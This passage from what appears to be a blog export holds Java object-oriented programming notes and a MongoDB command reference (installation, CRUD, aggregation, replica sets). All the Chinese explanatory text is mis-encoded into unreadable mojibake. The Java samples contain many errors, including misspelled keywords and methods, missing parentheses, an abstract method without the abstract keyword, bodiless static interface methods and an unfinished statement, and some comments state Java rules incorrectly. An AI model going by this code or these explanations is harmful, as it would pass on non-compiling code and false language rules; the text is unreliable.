<h2 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> **extends** Persion&#123;</span><br><span class="line">	<span class="comment">//è¯­å¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é‡å†™ä¸thisã€superã€å¤šæ€"><a href="#é‡å†™ä¸thisã€superã€å¤šæ€" class="headerlink" title="é‡å†™ä¸thisã€superã€å¤šæ€"></a>é‡å†™ä¸thisã€superã€å¤šæ€</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å­ç±»é‡å†™çˆ¶ç±»çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">//é‡å†™æ˜¯å‘ç”Ÿåœ¨çˆ¶ç±»ä¸å­ç±»ä¹‹é—´çš„ï¼Œé‡è½½æ˜¯å‘ç”Ÿåœ¨åŒä¸€ä¸ªç±»é‡Œé¢çš„ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//çˆ¶ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Parent</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;çˆ¶ç±»æ— å‚æ„é€ æ–¹æ³•&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">protected</span> String name=<span class="string">&quot;woshinibaba&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;father&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å­ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Son</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//**æ­¤å¤„ä¼šè°ƒç”¨çˆ¶ç±»çš„æ— å‚æ„é€ æ–¹æ³•ï¼ï¼ï¼çˆ¶ç±»å¦‚æœå®šä¹‰äº†æœ‰å‚æ„é€ æ–¹æ³•ï¼Œé‚£ä¹ˆå­ç±»å°†ä¸èƒ½å®šä¹‰æ— å‚æ„é€ æ–¹æ³•**</span></span><br><span class="line">		System.out.println(<span class="string">&quot;å­—ç±»æ— å‚æ„é€ æ–¹æ³•&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">private</span> String name=<span class="string">&quot;armandhe&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;&#125;</span><br><span class="line">	<span class="meta">@Override</span>  <span class="comment">//é‡å†™ æ–¹æ³•åç›¸åŒï¼Œå‚æ•°åˆ—è¡¨å¿…é¡»ç›¸åŒï¼Œä¿®é¥°ç¬¦èŒƒå›´å¯ä»¥æ‰©å¤§ï¼Œä½†ä¸å¯ä»¥ç¼©å°ï¼ŒæŠ›å‡ºå¼‚å¸¸çš„èŒƒå›´å¯ä»¥ç¼©å°ä½†ä¸å¯ä»¥æ‰©å¤§ã€‚</span></span><br><span class="line">							<span class="comment">//public &gt; protected &gt; default &gt; private</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.print(<span class="string">&quot;son&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String name)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.run(); <span class="comment">//è¾“å‡ºson</span></span><br><span class="line">		run(); <span class="comment">//è¾“å‡ºsonï¼Œå°±è¿‘åŸåˆ™</span></span><br><span class="line">		<span class="built_in">super</span>.run(); <span class="comment">//è¾“å‡ºfather</span></span><br><span class="line">		System.out.pintln(name); <span class="comment">//è¾“å‡ºå‚æ•°ä¸­çš„name</span></span><br><span class="line">		System.out.println(<span class="built_in">this</span>.name); <span class="comment">//è¾“å‡ºç±»å˜é‡name</span></span><br><span class="line">		System.out.println(<span class="built_in">super</span>.name); <span class="comment">//è¾“å‡ºçˆ¶ç±»çš„name</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">Parent</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Parent</span>;</span><br><span class="line">		<span class="type">Son</span> <span class="variable">son</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>;</span><br><span class="line">		<span class="type">Parent</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>; **<span class="comment">//æ³¨æ„è¿™ç§è°ƒç”¨æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯å®ä¾‹åŒ–äº†çˆ¶ç±»çš„å¼•ç”¨ï¼Œ</span></span><br><span class="line">															 <span class="comment">//åœ¨å…¶ä¸­å¯ä»¥ä½¿ç”¨çˆ¶ç±»çš„æ–¹æ³•ä¸å±æ€§ï¼Œä½†ä¸å¯ä»¥ä½¿ç”¨å­</span></span><br><span class="line">															 <span class="comment">//ç±»ä¸­ç‹¬æœ‰çš„æ–¹æ³•ä¸å±æ€§ï¼Œä½†å¯ä»¥ä½¿ç”¨å­ç±»ä¸­é‡å†™çš„çˆ¶ç±»çš„æ–¹æ³•ã€‚</span></span><br><span class="line">															 <span class="comment">//åªé’ˆå¯¹éé™æ€æ–¹æ³•</span></span><br><span class="line">															 <span class="comment">//é™æ€æ–¹æ³•ä¸å­˜åœ¨é‡å†™çš„æ¦‚å¿µï¼Œé™æ€æ–¹æ³•åœ¨ç±»è¢«åŠ è½½çš„æ—¶å€™å°±è¢«åŠ è½½äº†**</span></span><br><span class="line">		parent.run(); <span class="comment">//è¾“å‡ºfather</span></span><br><span class="line">		son.run(); <span class="comment">//è¾“å‡ºson</span></span><br><span class="line">		son.test(<span class="string">&quot;hjx&quot;</span>); <span class="comment">//åˆ†åˆ«è¾“å‡ºhjx ä¸ armandhe ä¸ woshinibaba</span></span><br><span class="line">		test.run(); <span class="comment">//è¾“å‡ºson</span></span><br><span class="line">		test.</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Instanceof"><a href="#Instanceof" class="headerlink" title="Instanceof"></a>Instanceof</h2><p>instanceof åˆ¤æ–­ä¸¤ä¸ªç±»ä¹‹é—´æœ‰æ²¡æœ‰çˆ¶å­å…³ç³»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object =&gt; Person =&gt; Student ===object <span class="comment">//å®ä¾‹å¯¹è±¡ </span></span><br><span class="line"><span class="type">Student</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>;</span><br><span class="line"><span class="type">Person</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>; </span><br><span class="line">object <span class="keyword">instanceof</span> Student <span class="comment">//ä¸Šè¿°ä¸‰ç§è¯·å¼€ç»™ä½ å‡ä¸ºtrue</span></span><br></pre></td></tr></table></figure>

<h2 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person obj <span class="keyword">new</span> <span class="title class_">Student</span>;</span><br><span class="line"><span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> (Student)obj <span class="comment">//å¼ºåˆ¶ç±»å‹è½¬æ¢ é«˜è½¬ä½ å‘ä¸‹è½¬å‹ï¼Œå¯èƒ½ä¼šä¸¢å¤±ä¸€äº›æ–¹æ³•</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> student; <span class="comment">//è‡ªåŠ¨ç±»å‹è½¬æ¢ ä½è½¬é«˜ å‘ä¸Šè½¬å‹</span></span><br></pre></td></tr></table></figure>

<h2 id="ä»£ç å—"><a href="#ä»£ç å—" class="headerlink" title="ä»£ç å—"></a>ä»£ç å—</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="comment">//åŒ¿åä»£ç å—</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">		<span class="comment">//é™æ€ä»£ç å—</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ‰§è¡Œé¡ºåº</span></span><br><span class="line"><span class="comment">//é™æ€ä»£ç å—åœ¨ç±»åŠ è½½çš„æ—¶å€™æ‰§è¡Œï¼ŒåŒ¿åä»£ç å—åœ¨å®ä¾‹åŒ–ç±»çš„æ—¶å€™æ‰§è¡Œï¼Œå†æ‰§è¡Œæ„é€ æ–¹æ³•</span></span><br></pre></td></tr></table></figure>

<h2 id="å¯¼å…¥åŒ…"><a href="#å¯¼å…¥åŒ…" class="headerlink" title="å¯¼å…¥åŒ…"></a>å¯¼å…¥åŒ…</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Math.random <span class="comment">//é™æ€å¯¼å…¥åŒ…ï¼Œå¯¼å…¥åå¯ä»¥ç›´æ¥è°ƒç”¨</span></span><br><span class="line">System.out.print(random());</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¢«finalä¿®é¥°çš„ç±»ä¸èƒ½è¢«ç»§æ‰¿ï¼Œè¯¥ç±»å­˜åœ¨å†…å­˜çš„æ–¹æ³•åŒºä¸­</span></span><br><span class="line">publib <span class="keyword">final</span> <span class="keyword">void</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;<span class="comment">//è¯­å¥&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è¢«abstractä¿®é¥°çš„ç±»ï¼ŒæŠ½è±¡ç±»å¯ä»¥æœ‰æŠ½è±¡æ–¹æ³•å’Œæ™®é€šæ–¹æ³•ï¼Œæœ‰æŠ½è±¡æ–¹æ³•çš„ç±»å¿…é¡»æ˜¯æŠ½è±¡ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Action</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span>; <span class="comment">//æŠ½è±¡æ–¹æ³•ï¼Œåªæœ‰æ–¹æ³•åï¼Œæ²¡æœ‰æ–¹æ³•ä½“ã€‚åªæ˜¯ä¸€ä¸ªçº¦æŸ</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doanotherthing</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//æ™®é€šæ–¹æ³•</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŠ½è±¡ç±»ä¸èƒ½è¢«ç”¨æ¥ç›´æ¥åˆ›å»ºå¯¹è±¡ï¼Œå³ä¸èƒ½ä½¿ç”¨newæ–¹æ³•åˆ›å»ºã€‚</span></span><br><span class="line"><span class="comment">//å­ç±»åœ¨ç»§æ‰¿æŠ½è±¡ç±»çš„æ—¶å€™ï¼Œå¿…é¡»è¦é‡å†™æŠ½è±¡ç±»çš„æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> run <span class="keyword">extends</span> <span class="title class_">Action</span>&#123;</span><br><span class="line">	<span class="meta">@override</span></span><br><span class="line">	<span class="keyword">public</span> boid <span class="title function_">dosomething</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//é‡å†™çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ¥å£ä¸­åªæœ‰è§„èŒƒï¼Œè‡ªå·±æ— æ³•å†™æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserServer</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>; <span class="comment">//public ä¸static å¯ä»¥çœç•¥ï¼Œé»˜è®¤ä¸ºè¿™æ¥ç»™ä½ ä¸ªä¿®é¥°ç¬¦</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TimeServer</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">time</span><span class="params">()</span>; <span class="comment">//public ä¸static å¯ä»¥çœç•¥ï¼Œé»˜è®¤ä¸ºè¿™æ¥ç»™ä½ ä¸ªä¿®é¥°ç¬¦</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServerImpl</span> <span class="keyword">implements</span> <span class="title class_">UserServer</span>,TimeServer&#123;</span><br><span class="line">	<span class="comment">//æ¥å£å¯ä»¥å®ç°å¤šç»§æ‰¿</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//é‡å†™æ–¹æ³•</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">time</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="comment">//é‡å†™æ–¹æ³•</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>ç¼–ç¨‹è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Javaè¯­æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>Mongodb</title>
    <url>/archives/20475214.html</url>
    <content><![CDATA[<h1 id="Mongodb"><a href="#Mongodb" class="headerlink" title="Mongodb"></a>Mongodb</h1><h1 id="æ•°æ®åº“å®‰è£…"><a href="#æ•°æ®åº“å®‰è£…" class="headerlink" title="æ•°æ®åº“å®‰è£…"></a>æ•°æ®åº“å®‰è£…</h1><p>å®‰è£…å®Œæˆåéœ€è¦æ‰‹åŠ¨åˆ›å»ºæ•°æ®ç›®å½•ï¼Œä½†è¿™ä¸ªç›®å½•ä¸ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œéœ€è¦æ‰‹åŠ¨åˆ›å»ºï¼Œæ•°æ®ç›®å½•é»˜è®¤å­˜å‚¨åœ¨dnç›®å½•ä¸‹ï¼Œæœ€å¥½åˆ›å»ºåœ¨æ ¹ç›®å½•ä¸‹</p>
<p>cd d\</p>
<p>md â€œ\data\dbâ€</p>
<p>æ·»åŠ ç¯å¢ƒå˜é‡ï¼šå°†mongodbçš„å®‰è£…ç›®å½•ä¸‹çš„binç›®å½•æ·»åŠ åˆ°ç¯å¢ƒå˜é‡</p>
<p>mongod â€”dbpath d:\data\db &#x2F;&#x2F;æŒ‡å®šæ•°æ®ç›®å½•</p>
<p>åˆ›å»ºæ—¥å¿—ç›®å½•</p>
<p>cd d:\</p>
<p>mkdir d:\data\log</p>
<p>é…ç½®æ•°æ®ç›®å½•ä¸æ—¥å¿—ç›®å½•</p>
<p>åœ¨mongodbçš„å®‰è£…ç›®å½•ä¸­åˆ›å»ºmogod.cfgæ–‡ä»¶ï¼Œå‘é‡Œé¢å†™å…¥ä¸€ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemLog:</span><br><span class="line">    destination: file</span><br><span class="line">    path: d:\data\log\mongod.log</span><br><span class="line">storage:</span><br><span class="line">    dbPath: d:\data\db</span><br></pre></td></tr></table></figure>

<h1 id="å®‰è£…mongodbæœåŠ¡"><a href="#å®‰è£…mongodbæœåŠ¡" class="headerlink" title="å®‰è£…mongodbæœåŠ¡"></a>å®‰è£…mongodbæœåŠ¡</h1><p>mongod â€”config â€œd:\EXE\mongodb\mongodb.cfgâ€ â€”install</p>
<h1 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h1><p><strong>å¯åŠ¨æœåŠ¡</strong></p>
<p>net start mongodb</p>
<p><strong>åœæ­¢æœåŠ¡</strong></p>
<p>net stop mongodb</p>
<p><strong>å¯åŠ¨æ•°æ®åº“</strong></p>
<p>mongod</p>
<p><strong>ç™»å½•é»˜è®¤ç”¨æˆ·</strong></p>
<p>mongo</p>
<p><strong>è´¦å·ç”¨æˆ·åç™»å½•</strong></p>
<p>mongo â€”port 27017 -u admin -p yourpassword</p>
<p><strong>è¿æ¥æ•°æ®åº“</strong></p>
<p>è¿æ¥ä¸€å°æœåŠ¡å™¨</p>
<p>mongodb:&#x2F;&#x2F;username:password@hostname:port&#x2F;[databasename][?options]</p>
<p>mongodb:&#x2F;&#x2F;host1,host2,host3&#x2F;?safe&#x3D;true;w&#x3D;2;wtimeoutMS&#x3D;2000</p>
<p>&#x2F;&#x2F;è¿æ¥åˆ°ä¸‰å°æœåŠ¡å™¨ï¼Œå¹¶è‡³å°‘ç­‰å¾…ä¸¤å°å¤åˆ¶æœåŠ¡å™¨å†™å…¥æˆåŠŸï¼Œè¶…æ—¶æ—¶é—´2s</p>
<p>mongodb:&#x2F;&#x2F;host1,host2,host3&#x2F;?connect&#x3D;direct,slaveOK&#x3D;true</p>
<p>&#x2F;&#x2F;ç›´è¿åˆ°ç¬¬ä¸€å°æœåŠ¡å™¨ï¼Œä¸åŒºåˆ†ç¬¬ä¸€å°æœåŠ¡å™¨æ˜¯ä¸»æœåŠ¡å™¨è¿˜æ˜¯ä»æœåŠ¡å™¨</p>
<h1 id="æ•°æ®åº“æ“ä½œ"><a href="#æ•°æ®åº“æ“ä½œ" class="headerlink" title="æ•°æ®åº“æ“ä½œ"></a>æ•°æ®åº“æ“ä½œ</h1><p><strong>åˆ›å»ºæ•°æ®åº“</strong></p>
<p>use databasename &#x2F;&#x2F;ä½¿ç”¨æ•°æ®åº“ï¼Œå¦‚æœæ•°æ®åº“ä¸å­˜åœ¨åˆ™åˆ›å»ºæ•°æ®å¯</p>
<p><strong>æŸ¥çœ‹å½“å‰æ•°æ®åº“</strong></p>
<p>db</p>
<p><strong>æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</strong></p>
<p>show dbs</p>
<p><strong>åˆ é™¤æ•°æ®åº“</strong></p>
<p>db.dropDatabase()</p>
<p><strong>åˆ›å»ºé›†åˆ</strong></p>
<p>db.createCollection(name,option)</p>
<p>option: capped&#x3D;true åˆ›å»ºå›ºå®šé›†åˆï¼Œæœ‰å›ºå®šçš„å¤§å°ï¼Œå½“è¾¾åˆ°æœ€å¤§å€¼çš„æ—¶å€™è‡ªåŠ¨è¦†ç›–æœ€æ—©çš„æ–‡æ¡£</p>
<p>size ,æŒ‡å®šå›ºå®šé›†åˆçš„æœ€å¤§å€¼ï¼Œå­—èŠ‚</p>
<p>max,å›ºå®šé›†åˆä¸­åŒ…å«æ–‡æ¡£çš„æ•°é‡</p>
<p>é›†åˆä¸æ˜¯å¿…é¡»åˆ›å»ºçš„ï¼Œæ‰§è¡Œ</p>
<p>db.collectionname.insert()</p>
<p>å½“æ‰§è¡Œä¸Šè¿°å‘½ä»¤çš„æ—¶å€™ï¼Œå°†è‡ªåŠ¨åˆ›å»ºé›†åˆ</p>
<p>æ‰‹åŠ¨åˆ›å»ºçš„é›†åˆå¿…é¡»åœ¨æ’å…¥æ•°æ®ä¹‹åæ‰ä¼šçœŸæ­£ ç”Ÿæ•ˆã€‚</p>
<p><strong>æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­çš„é›†åˆ</strong></p>
<p>show collections</p>
<p>show tables</p>
<p><strong>åˆ é™¤é›†åˆ</strong></p>
<p>db.collectionname.drop()</p>
<p><strong>æ’å…¥æ–‡æ¡£</strong></p>
<p>db.collectionname.insert({</p>
<p>â€œnameâ€:â€hjxâ€,</p>
<p>â€œageâ€:â€25â€</p>
<p>})</p>
<p>db.collectionname.insertOne({})</p>
<p>db.collectionname.insertMany([{}ï¼Œ{}],{</p>
<p>writeConcern:1 &#x2F;&#x2F;å†™å…¥ç­–ç•¥ï¼Œ1ä¸ºè¦æ±‚ç¡®è®¤å†™æ“ä½œ</p>
<p>ordered:true &#x2F;&#x2F;æ˜¯å¦æŒ‰é¡ºåºæ’å…¥</p>
<p>})</p>
<p><strong>æ’å…¥å¤šä¸ªæ–‡æ¡£</strong></p>
<p>db.collectionname.save({}) &#x2F;&#x2F;å¦‚æœæŒ‡å®šäº†_idå­—æ®µï¼Œåˆ™æ›´æ–°æ–‡æ¡£</p>
<p><strong>æ›´æ–°æ–‡æ¡£</strong></p>
<p>db.collection.update({æ¡ä»¶}ï¼Œ{ç›®æ ‡}ï¼Œ{</p>
<p>upsert:true &#x2F;&#x2F;å¦‚æœä¸å­˜åœ¨è®°å½•ï¼Œæ˜¯å¦æ’å…¥</p>
<p>mutil: true &#x2F;&#x2F;æ˜¯å¦æ›´æ–°æ‰€æœ‰åŒ¹é…è®°å½•</p>
<p>writeConcern: &#x2F;&#x2F;æŠ›å‡ºå¼‚å¸¸çš„çº§åˆ«</p>
<p>})</p>
<p><strong>åˆ é™¤æ–‡æ¡£</strong></p>
<p>db.collection.remove(</p>
<p>{æ¡ä»¶},</p>
<p>{</p>
<p>justone: true &#x2F;&#x2F;æ˜¯å¦åªåˆ é™¤ç¬¬ä¸€æ¡åŒ¹é…è®°å½•</p>
<p>writeConcern:</p>
<p>}</p>
<p>)</p>
<p>db.collectionanme.remove({}) &#x2F;&#x2F;åˆ é™¤æ‰€æœ‰æ–‡æ¡£</p>
<p><strong>æŸ¥è¯¢æ–‡æ¡£</strong></p>
<p>db.collcetionname.find({æ¡ä»¶}).pretty()</p>
<p>db.collectionname.findOne()</p>
<p>æ¯”è¾ƒè¿ç®—ç¬¦</p>
<p>$lt</p>
<p>$gt</p>
<p>$lte</p>
<p>$gte</p>
<p>$ne</p>
<p>é€»è¾‘è¿ç®—ç¬¦</p>
<p>$or</p>
<p>db.collectionname.find({â€œnameâ€:â€ä½•çºªé›„â€,â€ageâ€:{$lt:30},$or:[{â€œgenderâ€:â€manâ€},{â€œgenderâ€:â€â€female}]}) <a href="//and">&#x2F;&#x2F;and</a> or</p>
<p>é€šè¿‡ç±»å‹æŸ¥è¯¢</p>
<p>db.collectionname.find({â€œnameâ€:{$type:â€stringâ€}})</p>
<p>db.collectionname.find().limit(1)</p>
<p>db.collectionname.find().skip(1)</p>
<p>db.collectionname.find().sort({â€œkeyâ€:1}) <a href="//1">&#x2F;&#x2F;1</a> å‡åº -1 é™åº</p>
<p>db.collectionname.createIndex({â€œkeysâ€:1}) <a href="//1%E5%8D%87%E5%BA%8F">&#x2F;&#x2F;1å‡åº</a> -1 é™åº</p>
<p><strong>èšåˆ</strong></p>
<p>db.collectionname.aggregate([{$group:{_id:â€$nameâ€,åˆ«å:{$sum:â€$å­—æ®µâ€}}}])</p>
<p>$sum</p>
<p>$avg</p>
<p>$min</p>
<p>$max</p>
<p>$push &#x2F;&#x2F;å°†ç»“æœæ–‡æ¡£æ’å…¥åˆ°ä¸€ä¸ªæ•°ç»„ä¸­</p>
<p>$addToSet &#x2F;&#x2F;å°†ç»“æœæ–‡æ¡£æ’å…¥åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œä½†ä¸åˆ›å»ºæ•°ç»„</p>
<p>$first &#x2F;&#x2F;è·å–ç»“æœæ–‡æ¡£æŒ‰åºæ’åˆ—çš„ç¬¬ä¸€ä¸ªæ–‡æ¡£</p>
<p>$last &#x2F;&#x2F;è·å–ç»“æ„æ–‡æ¡£æŒ‰åºæ’åˆ—çš„æœ€åä¸€ä¸ªæ–‡æ¡£</p>
<p><strong>ç®¡é“</strong></p>
<p>$project</p>
<p>$match</p>
<p>$limit</p>
<p>$skip</p>
<p>$unwind</p>
<p>$group</p>
<p>$sort</p>
<p>$geoNear</p>
<p>db.collcetionname.aggregate([{ç®¡é“1}ï¼Œ{ç®¡é“2}])</p>
<h1 id="MongoDBå¤åˆ¶"><a href="#MongoDBå¤åˆ¶" class="headerlink" title="MongoDBå¤åˆ¶"></a>MongoDBå¤åˆ¶</h1><p>MongoDBå¤åˆ¶æ˜¯å°†æ•°æ®åŒæ­¥åœ¨å¤šä¸ªæœåŠ¡å™¨çš„è¿‡ç¨‹ã€‚</p>
<p>å¤åˆ¶æä¾›äº†æ•°æ®çš„å†—ä½™å¤‡ä»½ï¼Œå¹¶åœ¨å¤šä¸ªæœåŠ¡å™¨ä¸Šå­˜å‚¨æ•°æ®å‰¯æœ¬ï¼Œæé«˜äº†æ•°æ®çš„å¯ç”¨æ€§ï¼Œ å¹¶å¯ä»¥ä¿è¯æ•°æ®çš„å®‰å…¨æ€§ã€‚</p>
<p>å¤åˆ¶è¿˜å…è®¸æ‚¨ä»ç¡¬ä»¶æ•…éšœå’ŒæœåŠ¡ä¸­æ–­ä¸­æ¢å¤æ•°æ®ã€‚</p>
<h2 id="å¤åˆ¶åŸç†"><a href="#å¤åˆ¶åŸç†" class="headerlink" title="å¤åˆ¶åŸç†"></a>å¤åˆ¶åŸç†</h2><p>mongodbçš„å¤åˆ¶è‡³å°‘éœ€è¦ä¸¤ä¸ªèŠ‚ç‚¹ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯ä¸»èŠ‚ç‚¹ï¼Œè´Ÿè´£å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå…¶ä½™çš„éƒ½æ˜¯ä»èŠ‚ç‚¹ï¼Œè´Ÿè´£å¤åˆ¶ä¸»èŠ‚ç‚¹ä¸Šçš„æ•°æ®ã€‚</p>
<p>mongodbå„ä¸ªèŠ‚ç‚¹å¸¸è§çš„æ­é…æ–¹å¼ä¸ºï¼šä¸€ä¸»ä¸€ä»ã€ä¸€ä¸»å¤šä»ã€‚</p>
<p>ä¸»èŠ‚ç‚¹è®°å½•åœ¨å…¶ä¸Šçš„æ‰€æœ‰æ“ä½œoplogï¼Œä»èŠ‚ç‚¹å®šæœŸè½®è¯¢ä¸»èŠ‚ç‚¹è·å–è¿™äº›æ“ä½œï¼Œç„¶åå¯¹è‡ªå·±çš„æ•°æ®å‰¯æœ¬æ‰§è¡Œè¿™äº›æ“ä½œï¼Œä»è€Œä¿è¯ä»èŠ‚ç‚¹çš„æ•°æ®ä¸ä¸»èŠ‚ç‚¹ä¸€è‡´ã€‚</p>
<h2 id="å‰¯æœ¬é›†è®¾ç½®"><a href="#å‰¯æœ¬é›†è®¾ç½®" class="headerlink" title="å‰¯æœ¬é›†è®¾ç½®"></a>å‰¯æœ¬é›†è®¾ç½®</h2><p><strong>ä»¥å‰¯æœ¬é›†çš„æ–¹å¼å¯åŠ¨mongodb</strong></p>
<p>mongod â€”port 27017 â€”dbpath â€œdbfile_pathâ€ â€”replSet â€œå‰¯æœ¬é›†â€&#x2F;&#x2F;å‰¯æœ¬é›†è‡ªè¡Œå‘½å</p>
<p><strong>ç™»å½•mongodb</strong></p>
<p>mongo -u admin -p password</p>
<p><strong>å¯åŠ¨ä¸€ä¸ªæ–°çš„å‰¯æœ¬é›†</strong></p>
<p>rs.initiate()</p>
<p><strong>æŸ¥çœ‹å‰¯æœ¬é›†çš„é…ç½®</strong></p>
<p>rs.conf()</p>
<p><strong>æŸ¥çœ‹å‰¯æœ¬é›†çš„çŠ¶æ€</strong></p>
<p>rs.status()</p>
<p><strong>å‘å‰¯æœ¬é›†ä¸­æ·»åŠ æˆå‘˜</strong></p>
<p>rs.add(172.14.12.34:27017)</p>
<p><strong>åˆ¤æ–­å½“å‰æ˜¯å¦ä¸ºä¸»èŠ‚ç‚¹</strong></p>
<p>db.isMaster()</p>
